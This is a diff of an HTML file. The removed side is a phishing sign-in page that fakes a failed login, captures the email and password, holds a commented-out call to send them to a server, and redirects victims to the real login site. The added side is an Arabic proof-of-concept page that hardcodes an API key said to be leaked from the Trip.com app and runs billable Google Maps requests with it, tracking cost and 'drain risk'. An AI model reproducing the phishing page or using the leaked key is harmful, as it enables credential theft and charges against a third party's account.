@@ -1,75 +1,595 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="ar" dir="rtl">
 <head>
-    <meta charset="utf-8"/>
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
-    <title>Sign In</title>
-    <style>
-        body { background-color: #101215; color: #fff; font-family: ui-sans-serif, system-ui, -apple-system, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .login-container { background-color: #101215; width: 100%; max-width: 450px; padding: 74px 45px 30px; border-radius: 8px; box-shadow: 0 4px 24px rgba(0,0,0,0.12); text-align: center; position: relative; }
-        .logo-wrap { display: flex; justify-content: center; margin-bottom: 30px; }
-        .error-banner { background-color: rgba(255, 51, 51, 0.1); border: 1px solid #ff3333; color: #ff3333; padding: 12px; border-radius: 8px; margin-bottom: 25px; font-size: 14px; display: none; }
-        input { width: 100%; padding: 12px; margin-bottom: 15px; background: #000; border: 1px solid #333; color: #fff; border-radius: 4px; box-sizing: border-box; font-size: 16px; transition: border-color 0.2s ease-in-out; }
-        input:focus { border-color: #88f387; outline: none; }
-        .btn-signin { background-color: #88f387; color: rgba(0,0,0,0.87); border: none; padding: 12px; width: 100%; border-radius: 9999px; font-weight: 600; cursor: pointer; font-size: 16px; text-transform: capitalize; transition: background-color 0.2s ease-in-out; }
-        .btn-signin:hover { background-color: #5faa5e; }
-        .footer-links { margin-top: 20px; font-size: 13px; color: rgba(255, 255, 255, 0.7); }
-        .footer-links span { color: #88f387; font-weight: 700; cursor: pointer; }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>PoC — مفتاح Google Maps مكشوف في Trip.com</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Segoe UI', Tahoma, Arial, sans-serif;
+      background: #0d1117;
+      color: #e6edf3;
+      min-height: 100vh;
+    }
+    header {
+      background: linear-gradient(135deg, #1a1f2e 0%, #161b27 100%);
+      border-bottom: 2px solid #ff4444;
+      padding: 20px 30px;
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+    .badge {
+      background: #ff4444;
+      color: #fff;
+      font-size: 11px;
+      font-weight: 700;
+      padding: 4px 10px;
+      border-radius: 4px;
+      letter-spacing: 1px;
+    }
+    header h1 { font-size: 20px; color: #f0f0f0; }
+    header p { font-size: 12px; color: #8b949e; margin-top: 4px; }
+
+    .container { max-width: 1100px; margin: 30px auto; padding: 0 20px; }
+
+    .info-box {
+      background: #161b27;
+      border: 1px solid #21262d;
+      border-radius: 10px;
+      padding: 20px 25px;
+      margin-bottom: 24px;
+    }
+    .info-box h2 { font-size: 14px; color: #8b949e; margin-bottom: 12px; text-transform: uppercase; letter-spacing: 1px; }
+    .key-display {
+      background: #0d1117;
+      border: 1px solid #ff444455;
+      border-radius: 6px;
+      padding: 12px 16px;
+      font-family: monospace;
+      font-size: 15px;
+      color: #ff6b6b;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .key-display span { word-break: break-all; }
+    .copy-btn {
+      background: #21262d;
+      border: 1px solid #30363d;
+      color: #8b949e;
+      padding: 4px 12px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 12px;
+      white-space: nowrap;
+      margin-right: 10px;
+    }
+    .copy-btn:hover { background: #30363d; color: #e6edf3; }
+
+    .stats {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+      gap: 14px;
+      margin-bottom: 24px;
+    }
+    .stat-card {
+      background: #161b27;
+      border: 1px solid #21262d;
+      border-radius: 8px;
+      padding: 16px;
+      text-align: center;
+    }
+    .stat-card .val { font-size: 26px; font-weight: 700; }
+    .stat-card .lbl { font-size: 11px; color: #8b949e; margin-top: 4px; }
+    .stat-card.green .val { color: #3fb950; }
+    .stat-card.red .val { color: #ff4444; }
+    .stat-card.yellow .val { color: #d29922; }
+    .stat-card.blue .val { color: #58a6ff; }
+
+    .tabs {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 20px;
+      flex-wrap: wrap;
+    }
+    .tab-btn {
+      background: #21262d;
+      border: 1px solid #30363d;
+      color: #8b949e;
+      padding: 8px 18px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 13px;
+      transition: all 0.2s;
+    }
+    .tab-btn:hover { background: #30363d; color: #e6edf3; }
+    .tab-btn.active { background: #1f6feb; border-color: #1f6feb; color: #fff; }
+
+    .panel { display: none; }
+    .panel.active { display: block; }
+
+    .input-row {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 14px;
+      flex-wrap: wrap;
+    }
+    input[type="text"] {
+      flex: 1;
+      min-width: 220px;
+      background: #0d1117;
+      border: 1px solid #30363d;
+      color: #e6edf3;
+      padding: 10px 14px;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+    input[type="text"]:focus { outline: none; border-color: #1f6feb; }
+    button.action {
+      background: #1f6feb;
+      color: #fff;
+      border: none;
+      padding: 10px 22px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 14px;
+      font-weight: 600;
+      transition: background 0.2s;
+    }
+    button.action:hover { background: #388bfd; }
+    button.action:disabled { background: #21262d; color: #555; cursor: not-allowed; }
+
+    #map {
+      width: 100%;
+      height: 420px;
+      border-radius: 8px;
+      border: 1px solid #30363d;
+      margin-bottom: 14px;
+    }
+
+    .result-box {
+      background: #0d1117;
+      border: 1px solid #21262d;
+      border-radius: 6px;
+      padding: 14px;
+      font-family: monospace;
+      font-size: 12px;
+      max-height: 280px;
+      overflow-y: auto;
+      white-space: pre-wrap;
+      word-break: break-all;
+      line-height: 1.6;
+    }
+    .result-box .ok { color: #3fb950; }
+    .result-box .err { color: #ff4444; }
+    .result-box .key { color: #79c0ff; }
+    .result-box .val { color: #f0f0f0; }
+    .result-box .label { color: #d29922; }
+
+    .log-entry {
+      padding: 8px 12px;
+      margin-bottom: 6px;
+      border-radius: 5px;
+      border-right: 3px solid;
+      font-size: 13px;
+    }
+    .log-entry.success { background: #0d2818; border-color: #3fb950; }
+    .log-entry.fail { background: #1f0e0e; border-color: #ff4444; }
+    .log-entry .log-time { color: #8b949e; font-size: 11px; }
+    .log-entry .log-api { font-weight: 700; }
+
+    .cost-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 13px;
+    }
+    .cost-table th {
+      background: #21262d;
+      padding: 10px 14px;
+      text-align: right;
+      color: #8b949e;
+      font-weight: 600;
+    }
+    .cost-table td {
+      padding: 10px 14px;
+      border-bottom: 1px solid #21262d;
+    }
+    .cost-table tr:hover td { background: #161b27; }
+    .cost-table .status-ok { color: #3fb950; font-weight: 700; }
+    .cost-table .status-no { color: #ff4444; }
+    .cost-table .cost { color: #d29922; font-weight: 700; }
+
+    .highlight { color: #ff6b6b; font-weight: 700; }
+    .spinner {
+      display: inline-block;
+      width: 14px; height: 14px;
+      border: 2px solid #30363d;
+      border-top-color: #1f6feb;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin-left: 8px;
+      vertical-align: middle;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .warning-bar {
+      background: #2d1b00;
+      border: 1px solid #d29922;
+      border-radius: 8px;
+      padding: 12px 18px;
+      margin-bottom: 20px;
+      font-size: 13px;
+      color: #d29922;
+    }
+  </style>
 </head>
 <body>
 
-<div class="login-container">
-    <div class="logo-wrap">
-        <svg width="120" height="120" viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M32.0699 27.3479C31.4181 26.713 30.5813 26.2769 29.6666 26.0952C28.7518 25.9134 27.8006 25.9945 26.9347 26.3278C26.0687 26.6612 25.3274 27.2317 24.8055 27.9665C24.2837 28.7013 24.005 29.5669 24.005 30.4527V90.342C23.9756 90.9434 24.0752 91.5441 24.2977 92.1079C24.5203 92.6717 24.8612 93.1869 25.2999 93.6223C25.7385 94.0578 26.2658 94.4043 26.8498 94.6411C27.4339 94.8779 28.0625 95 28.6978 95C29.333 95 29.9617 94.8779 30.5457 94.6411C31.1297 94.4043 31.657 94.0578 32.0956 93.6223C32.5343 93.1869 32.8752 92.6717 33.0978 92.1079C33.3203 91.5441 33.42 90.9434 33.3905 90.342V41.4389L50.0748 57.6794L56.7182 51.3934L32.0699 27.3479Z" fill="#62D361"></path>
-            <path d="M93.0714 26.3257C92.2058 25.9934 91.2552 25.9131 90.3413 26.0952C89.4273 26.2773 88.5913 26.7134 87.9401 27.3479L63.1607 51.4316L69.8042 57.7272L86.6094 41.3912V90.342C86.58 90.9434 86.6795 91.5441 86.9021 92.1079C87.1247 92.6717 87.4656 93.1869 87.9042 93.6224C88.3429 94.0578 88.8702 94.4043 89.4542 94.6411C90.0383 94.8779 90.6669 95 91.3022 95C91.9374 95 92.566 94.8779 93.15 94.6411C93.7341 94.4043 94.2613 94.0578 94.7 93.6224C95.1387 93.1869 95.4796 92.6717 95.7022 92.1079C95.9248 91.5441 96.0244 90.9434 95.995 90.342V30.4527C95.9933 29.5678 95.7145 28.7033 95.1941 27.9687C94.6737 27.234 93.935 26.6622 93.0714 26.3257Z" fill="#62D361"></path>
-            <path d="M60.2666 54.9186L59.934 54.5938L59.6013 54.9186L53.2401 60.9467L59.934 67.29L66.6278 60.9467L60.2666 54.9186Z" fill="#62D361"></path>
-        </svg>
-    </div>
-    
-    <h2 style="font-size: 28px; margin: 0 0 30px;">Sign In</h2>
+<header>
+  <div>
+    <div class="badge">CRITICAL</div>
+  </div>
+  <div>
+    <h1>🔑 Proof of Concept — مفتاح Google Maps API مكشوف</h1>
+    <p>Trip.com Android App v8.47.0 · classes3.dex · com.google.android.geo.API_KEY</p>
+  </div>
+</header>
 
-    <div id="errorMsg" class="error-banner">
-        Sign-in failed. Please verify your credentials and try again.
-    </div>
+<div class="container">
 
-    <form id="phishingForm">
-        <input type="email" id="email" placeholder="Email Address" required>
-        <input type="password" id="password" placeholder="Password" required>
-        
-        <button type="submit" class="btn-signin">Sign In</button>
-    </form>
+  <div class="warning-bar">
+    ⚠️ هذا اختبار أمني توضيحي فقط — المفتاح مستخرج من التطبيق الرسمي Trip.com v8.47.0 ويُستخدم هنا لإثبات الثغرة
+  </div>
 
-    <div class="footer-links">
-        <span>Forgot Password?</span> | Don't have an account? <span>Sign Up</span>
+  <div class="info-box">
+    <h2>🔑 المفتاح المكتشف</h2>
+    <div class="key-display">
+      <span id="apiKeyDisplay">AIzaSyBPfDzns3EwtFtCBBXNxPQybe-odsQH0LU</span>
+      <button class="copy-btn" onclick="copyKey()">نسخ</button>
     </div>
+    <p style="margin-top:10px;font-size:12px;color:#8b949e;">
+      📍 الموقع: <code style="color:#79c0ff;">classes3.dex</code> &nbsp;|&nbsp;
+      🏷️ المتغير: <code style="color:#79c0ff;">com.google.android.geo.API_KEY</code> &nbsp;|&nbsp;
+      📦 الحزمة: <code style="color:#79c0ff;">ctrip.english</code>
+    </p>
+  </div>
+
+  <div class="stats">
+    <div class="stat-card green">
+      <div class="val" id="statActive">0</div>
+      <div class="lbl">APIs مفعّلة</div>
+    </div>
+    <div class="stat-card red">
+      <div class="val" id="statDenied">0</div>
+      <div class="lbl">APIs مرفوضة</div>
+    </div>
+    <div class="stat-card yellow">
+      <div class="val" id="statCost">$0</div>
+      <div class="lbl">تكلفة هذا الجلسة</div>
+    </div>
+    <div class="stat-card blue">
+      <div class="val" id="statReqs">0</div>
+      <div class="lbl">إجمالي الطلبات</div>
+    </div>
+  </div>
+
+  <div class="tabs">
+    <button class="tab-btn active" onclick="showTab('tab-map')">🗺️ خريطة تفاعلية</button>
+    <button class="tab-btn" onclick="showTab('tab-places')">📍 Places API</button>
+    <button class="tab-btn" onclick="showTab('tab-directions')">🚗 Directions API</button>
+    <button class="tab-btn" onclick="showTab('tab-scan')">📊 فحص APIs</button>
+    <button class="tab-btn" onclick="showTab('tab-log')">📋 سجل الطلبات</button>
+  </div>
+
+  <!-- TAB: MAP -->
+  <div id="tab-map" class="panel active">
+    <div class="info-box">
+      <h2>🗺️ خريطة Google Maps تعمل بالمفتاح المكشوف</h2>
+      <p style="font-size:13px;color:#8b949e;margin-bottom:14px;">الخريطة أدناه تعمل مباشرة باستخدام المفتاح المكشوف</p>
+      <div id="map"></div>
+      <p id="mapStatus" style="font-size:12px;color:#8b949e;margin-top:8px;"></p>
+    </div>
+  </div>
+
+  <!-- TAB: PLACES -->
+  <div id="tab-places" class="panel">
+    <div class="info-box">
+      <h2>📍 Places API — بحث عن أماكن</h2>
+      <div class="input-row">
+        <input type="text" id="placeInput" value="Dubai International Airport" placeholder="ابحث عن مكان..." />
+        <button class="action" onclick="searchPlace()">بحث</button>
+      </div>
+      <div id="placeResult" class="result-box">في انتظار البحث...</div>
+    </div>
+  </div>
+
+  <!-- TAB: DIRECTIONS -->
+  <div id="tab-directions" class="panel">
+    <div class="info-box">
+      <h2>🚗 Directions API — حساب المسارات</h2>
+      <div class="input-row">
+        <input type="text" id="dirFrom" value="Dubai Airport" placeholder="من..." />
+        <input type="text" id="dirTo" value="Burj Khalifa" placeholder="إلى..." />
+        <button class="action" onclick="getDirections()">احسب المسار</button>
+      </div>
+      <div id="dirResult" class="result-box">في انتظار الطلب...</div>
+    </div>
+  </div>
+
+  <!-- TAB: SCAN -->
+  <div id="tab-scan" class="panel">
+    <div class="info-box">
+      <h2>📊 نتائج فحص APIs المفعّلة</h2>
+      <button class="action" onclick="runFullScan()" id="scanBtn">🔍 تشغيل الفحص الكامل</button>
+      <br/><br/>
+      <table class="cost-table">
+        <thead>
+          <tr>
+            <th>API</th>
+            <th>الحالة</th>
+            <th>تكلفة / 1000 طلب</th>
+            <th>خطر الاستنزاف</th>
+          </tr>
+        </thead>
+        <tbody id="scanTableBody">
+          <tr><td colspan="4" style="text-align:center;color:#8b949e;padding:20px;">اضغط "تشغيل الفحص الكامل" أعلاه</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- TAB: LOG -->
+  <div id="tab-log" class="panel">
+    <div class="info-box">
+      <h2>📋 سجل جميع الطلبات</h2>
+      <div id="requestLog" style="max-height:400px;overflow-y:auto;">
+        <p style="color:#8b949e;font-size:13px;">لا توجد طلبات بعد...</p>
+      </div>
+    </div>
+  </div>
+
 </div>
 
+<!-- Google Maps JS SDK باستخدام المفتاح المكشوف -->
 <script>
-    // Forced error message presentation to mimic a failed session and coerce data re-entry
-    window.onload = function() {
-        document.getElementById('errorMsg').style.display = 'block';
-    };
+  const API_KEY = "AIzaSyBPfDzns3EwtFtCBBXNxPQybe-odsQH0LU";
+  let totalRequests = 0;
+  let activeAPIs = 0;
+  let deniedAPIs = 0;
+  let totalCost = 0;
+  const logs = [];
 
-    document.getElementById('phishingForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-        
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('password').value;
+  const API_COSTS = {
+    'Places Find/Text': 17,
+    'Places Details': 17,
+    'Places Nearby': 32,
+    'Directions': 10,
+    'Geocoding': 5,
+    'Distance Matrix': 10,
+    'Maps JS SDK': 7,
+    'Elevation': 5,
+    'Time Zone': 5,
+  };
 
-        // Demonstration of captured data context (PoC Evidence logging)
-        console.log("Captured Credentials:", { email: email, password: pass });
+  function updateStats() {
+    document.getElementById('statActive').textContent = activeAPIs;
+    document.getElementById('statDenied').textContent = deniedAPIs;
+    document.getElementById('statCost').textContent = '$' + totalCost.toFixed(3);
+    document.getElementById('statReqs').textContent = totalRequests;
+  }
 
-        // Future Exfiltration Implementation (example for Vercel backend integration)
-        // fetch('/api/capture', { method: 'POST', body: JSON.stringify({email, pass}) });
+  function addLog(api, status, detail) {
+    totalRequests++;
+    const isOk = status === 'OK';
+    if (isOk) activeAPIs++;
+    else deniedAPIs++;
+    const cost = isOk ? (API_COSTS[api] || 5) / 1000 : 0;
+    totalCost += cost;
+    updateStats();
 
-        alert("PoC: Data captured successfully in a sandboxed environment.");
-        
-        // Anti-suspicion redirect to legitimate login endpoint
-        window.location.href = "https://makeitreal.eufymake.com/login/";
+    const entry = { time: new Date().toLocaleTimeString('ar'), api, status, detail, cost };
+    logs.unshift(entry);
+
+    const logDiv = document.getElementById('requestLog');
+    const el = document.createElement('div');
+    el.className = 'log-entry ' + (isOk ? 'success' : 'fail');
+    el.innerHTML = `
+      <span class="log-time">${entry.time}</span> &nbsp;
+      <span class="log-api">${api}</span> &nbsp;
+      <strong style="color:${isOk ? '#3fb950' : '#ff4444'}">${status}</strong>
+      ${cost > 0 ? `<span style="color:#d29922;float:left;">+$${cost.toFixed(4)}</span>` : ''}
+      <br/><span style="color:#8b949e;font-size:11px;">${detail}</span>
+    `;
+    if (logDiv.querySelector('p')) logDiv.innerHTML = '';
+    logDiv.prepend(el);
+  }
+
+  function showTab(id) {
+    document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+    event.target.classList.add('active');
+  }
+
+  function copyKey() {
+    navigator.clipboard.writeText(API_KEY);
+    event.target.textContent = '✓ تم النسخ';
+    setTimeout(() => event.target.textContent = 'نسخ', 2000);
+  }
+
+  // ---------- Places Search ----------
+  async function searchPlace() {
+    const q = document.getElementById('placeInput').value.trim();
+    const box = document.getElementById('placeResult');
+    box.innerHTML = '<span class="spinner"></span> جاري البحث...';
+
+    try {
+      const url = `https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=${encodeURIComponent(q)}&inputtype=textquery&fields=place_id,name,geometry,rating,formatted_address&key=${API_KEY}`;
+      const r = await fetch(url);
+      const data = await r.json();
+      addLog('Places Find/Text', data.status, `بحث: "${q}"`);
+
+      if (data.status === 'OK' && data.candidates.length > 0) {
+        const pid = data.candidates[0].place_id;
+        // Get details
+        const url2 = `https://maps.googleapis.com/maps/api/place/details/json?place_id=${pid}&fields=name,formatted_address,geometry,rating,user_ratings_total,international_phone_number,opening_hours&key=${API_KEY}`;
+        const r2 = await fetch(url2);
+        const d2 = await r2.json();
+        addLog('Places Details', d2.status, `Place ID: ${pid}`);
+
+        if (d2.status === 'OK') {
+          const res = d2.result;
+          box.innerHTML = `<span class="ok">✅ STATUS: OK</span>
+
+<span class="label">الاسم:</span>       <span class="val">${res.name || '—'}</span>
+<span class="label">العنوان:</span>     <span class="val">${res.formatted_address || '—'}</span>
+<span class="label">الإحداثيات:</span>  <span class="val">lat: ${res.geometry?.location?.lat}, lng: ${res.geometry?.location?.lng}</span>
+<span class="label">التقييم:</span>     <span class="val">${res.rating || '—'} ⭐ (${res.user_ratings_total?.toLocaleString() || '—'} تقييم)</span>
+<span class="label">الهاتف:</span>      <span class="val">${res.international_phone_number || '—'}</span>
+<span class="label">مفتوح الآن:</span> <span class="val">${res.opening_hours?.open_now ? '✅ نعم' : '❌ لا'}</span>
+<span class="label">Place ID:</span>    <span class="val">${pid}</span>
+
+<span style="color:#d29922;">💰 تكلفة هذين الطلبين: $${(34/1000).toFixed(4)}</span>`;
+        }
+      } else {
+        box.innerHTML = `<span class="err">❌ STATUS: ${data.status}</span>\n${data.error_message || ''}`;
+      }
+    } catch(e) {
+      box.innerHTML = `<span class="err">خطأ: ${e.message}</span>`;
+    }
+  }
+
+  // ---------- Directions ----------
+  async function getDirections() {
+    const from = document.getElementById('dirFrom').value.trim();
+    const to = document.getElementById('dirTo').value.trim();
+    const box = document.getElementById('dirResult');
+    box.innerHTML = '<span class="spinner"></span> جاري الحساب...';
+
+    try {
+      const url = `https://maps.googleapis.com/maps/api/directions/json?origin=${encodeURIComponent(from)}&destination=${encodeURIComponent(to)}&key=${API_KEY}`;
+      const r = await fetch(url);
+      const data = await r.json();
+      addLog('Directions', data.status, `${from} → ${to}`);
+
+      if (data.status === 'OK' && data.routes.length > 0) {
+        const leg = data.routes[0].legs[0];
+        const steps = leg.steps.map((s,i) => {
+          const instr = s.html_instructions.replace(/<[^>]+>/g, '');
+          return `  ${i+1}. ${instr} (${s.distance.text})`;
+        }).join('\n');
+
+        box.innerHTML = `<span class="ok">✅ STATUS: OK</span>
+
+<span class="label">من:</span>        <span class="val">${leg.start_address}</span>
+<span class="label">إلى:</span>       <span class="val">${leg.end_address}</span>
+<span class="label">المسافة:</span>   <span class="val">${leg.distance.text}</span>
+<span class="label">الوقت:</span>     <span class="val">${leg.duration.text}</span>
+<span class="label">الملخص:</span>    <span class="val">${data.routes[0].summary}</span>
+
+<span class="label">الخطوات:</span>
+${steps}
+
+<span style="color:#d29922;">💰 تكلفة هذا الطلب: $${(10/1000).toFixed(4)}</span>`;
+      } else {
+        box.innerHTML = `<span class="err">❌ STATUS: ${data.status}</span>\n${data.error_message || ''}`;
+      }
+    } catch(e) {
+      box.innerHTML = `<span class="err">خطأ: ${e.message}</span>`;
+    }
+  }
+
+  // ---------- Full Scan ----------
+  const SCAN_APIS = [
+    { name: 'Places Find/Text',  url: `https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=Dubai&inputtype=textquery&key=${API_KEY}`, cost: '$17' },
+    { name: 'Places Details',    url: `https://maps.googleapis.com/maps/api/place/details/json?place_id=ChIJaQ4mkwZdXz4R6e5IegDUleY&fields=name&key=${API_KEY}`, cost: '$17' },
+    { name: 'Places Nearby',     url: `https://maps.googleapis.com/maps/api/place/nearbysearch/json?location=25.2,55.27&radius=1000&key=${API_KEY}`, cost: '$32' },
+    { name: 'Directions',        url: `https://maps.googleapis.com/maps/api/directions/json?origin=Dubai&destination=AbuDhabi&key=${API_KEY}`, cost: '$10' },
+    { name: 'Geocoding',         url: `https://maps.googleapis.com/maps/api/geocode/json?address=Dubai&key=${API_KEY}`, cost: '$5' },
+    { name: 'Distance Matrix',   url: `https://maps.googleapis.com/maps/api/distancematrix/json?origins=Dubai&destinations=AbuDhabi&key=${API_KEY}`, cost: '$10' },
+    { name: 'Elevation',         url: `https://maps.googleapis.com/maps/api/elevation/json?locations=25.2,55.27&key=${API_KEY}`, cost: '$5' },
+    { name: 'Time Zone',         url: `https://maps.googleapis.com/maps/api/timezone/json?location=25.2,55.27&timestamp=1609459200&key=${API_KEY}`, cost: '$5' },
+  ];
+
+  async function runFullScan() {
+    const btn = document.getElementById('scanBtn');
+    btn.disabled = true;
+    btn.innerHTML = '<span class="spinner"></span> جارٍ الفحص...';
+    const tbody = document.getElementById('scanTableBody');
+    tbody.innerHTML = '';
+
+    for (const api of SCAN_APIS) {
+      const tr = document.createElement('tr');
+      tr.innerHTML = `<td>${api.name}</td><td><span class="spinner"></span></td><td class="cost">${api.cost} / 1000</td><td>—</td>`;
+      tbody.appendChild(tr);
+
+      try {
+        const r = await fetch(api.url);
+        const d = await r.json();
+        const ok = d.status === 'OK' || d.status === 'ZERO_RESULTS';
+        addLog(api.name, d.status, ok ? 'مفعّل ✅' : (d.error_message || d.status));
+        const risk = ok ? '🔴 عالي' : '—';
+        tr.innerHTML = `
+          <td><strong>${api.name}</strong></td>
+          <td class="${ok ? 'status-ok' : 'status-no'}">${ok ? '✅ مفعّل' : '❌ ' + d.status}</td>
+          <td class="cost">${api.cost} / 1000</td>
+          <td style="color:${ok ? '#ff4444' : '#8b949e'}">${risk}</td>`;
+      } catch(e) {
+        tr.innerHTML = `<td>${api.name}</td><td class="status-no">⚠️ خطأ شبكة</td><td class="cost">${api.cost}</td><td>—</td>`;
+      }
+      await new Promise(res => setTimeout(res, 400));
+    }
+
+    btn.disabled = false;
+    btn.textContent = '🔄 إعادة الفحص';
+  }
+
+  // ---------- Maps JS SDK ----------
+  function initMap() {
+    const mapEl = document.getElementById('map');
+    document.getElementById('mapStatus').textContent = '✅ خريطة Google Maps تعمل بالمفتاح المكشوف';
+    addLog('Maps JS SDK', 'OK', 'تم تحميل JavaScript SDK بنجاح');
+
+    const map = new google.maps.Map(mapEl, {
+      center: { lat: 25.2048, lng: 55.2708 },
+      zoom: 12,
+      mapTypeId: 'roadmap',
+      styles: [
+        { elementType: 'geometry', stylers: [{ color: '#1d2c4d' }] },
+        { elementType: 'labels.text.stroke', stylers: [{ color: '#1a3646' }] },
+        { elementType: 'labels.text.fill', stylers: [{ color: '#ffffff' }] },
+      ]
     });
+
+    const marker = new google.maps.Marker({
+      position: { lat: 25.2048, lng: 55.2708 },
+      map,
+      title: 'Trip.com – Leaked API Key PoC',
+      label: { text: '🔑', fontSize: '20px' }
+    });
+
+    const infoWindow = new google.maps.InfoWindow({
+      content: `<div style="font-family:monospace;color:#000;padding:6px;">
+        <b>🔑 Leaked Key Active</b><br>
+        <code style="font-size:11px">AIzaSyBPfDzns3EwtFtCBBXNxPQybe-odsQH0LU</code><br>
+        <span style="color:green;font-size:12px">✅ Maps JS SDK: Active</span>
+      </div>`
+    });
+
+    marker.addListener('click', () => infoWindow.open(map, marker));
+    infoWindow.open(map, marker);
+  }
+
+  function initMapError() {
+    document.getElementById('map').innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100%;color:#ff4444;">⚠️ Maps JS SDK غير مفعّل لهذا المفتاح</div>';
+    addLog('Maps JS SDK', 'REQUEST_DENIED', 'Maps JS SDK غير مفعّل');
+    document.getElementById('mapStatus').textContent = '❌ Maps JS SDK: غير مفعّل';
+  }
 </script>
+
+<script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBPfDzns3EwtFtCBBXNxPQybe-odsQH0LU&callback=initMap&libraries=places" onerror="initMapError()" async defer></script>
 
 </body>
 </html>
